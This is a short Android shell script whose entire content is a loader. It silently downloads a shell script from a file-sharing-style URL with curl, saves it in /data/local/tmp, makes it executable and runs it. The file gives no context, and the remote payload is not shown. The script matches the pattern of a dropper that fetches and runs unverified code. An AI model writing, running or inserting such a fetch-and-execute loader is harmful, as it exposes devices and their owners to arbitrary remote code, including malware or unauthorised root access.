#!/system/bin/sh
SCRIPT_URL="https://pan.shenzhi.shop/down.php/189efe4928adaba5314a010cea6eb344.sh"
TMP="/data/local/tmp/isu.sh"
curl -sL -o "$TMP" "$SCRIPT_URL" && chmod +x "$TMP" && exec "$TMP"
